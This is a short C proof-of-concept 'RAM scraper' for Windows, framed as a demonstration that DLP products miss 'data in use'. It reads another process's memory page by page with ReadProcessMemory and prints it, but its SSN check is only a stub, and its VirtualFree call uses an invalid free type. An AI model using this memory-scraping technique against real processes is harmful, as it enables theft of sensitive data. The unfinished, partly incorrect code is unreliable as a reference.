/*
	Basic, unoptimized, unhidden and purposefully noisy proof of concept RamScraper to atack "Data In Use".
	The idea is to prove the point of how easy it is to defeat all current DLP/IRM products by attacking "Data In Use",
	but not to help the bad guys build an optimized and stealthy attack tool. Therefore we are trying to evade DLP/IRM,
	but deliberately be caught by EDR/AVs.

	Insert A1FILO marketing here...

	s -u 0 L?0x7fffffff "222-22-2222"
*/

#include <Windows.h>
#include <stdio.h>
#include <processthreadsapi.h>
#include <memoryapi.h>

#define PAGE_SIZE 4096

BOOL isSocialSecurityNumber()
{
	return FALSE;
}

int main()
{
	DWORD PID = 7472;
	LPCVOID baseAddress = (PVOID)NULL;
	PVOID localCopyPointer;
	SIZE_T numBytesRead = 0;
	BOOL result;
	DWORD lastError;
	int retVal = -1;

	// write to windows event log

	localCopyPointer = VirtualAlloc(NULL, PAGE_SIZE, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (!localCopyPointer)
		return retVal;
	HANDLE processHandle = OpenProcess(PROCESS_VM_READ, FALSE, PID);
	if (!processHandle)
		goto freeVM;
	
	for (PBYTE current = (PBYTE)baseAddress; current < (PBYTE)0x100000000; current += PAGE_SIZE)
	{
		printf("scanning %p\n", current);
		result = ReadProcessMemory(processHandle, (PVOID)current, localCopyPointer, PAGE_SIZE, &numBytesRead);
		if (!result)
		{
			lastError = GetLastError();
			printf("error %d\n", lastError);
		}
		else
			printf("memory at %p: %X\n", current, *(int*)localCopyPointer);
	}

	retVal = 0;
	CloseHandle(processHandle);
freeVM:
	VirtualFree(localCopyPointer, PAGE_SIZE, MEM_FREE);

	return retVal;
}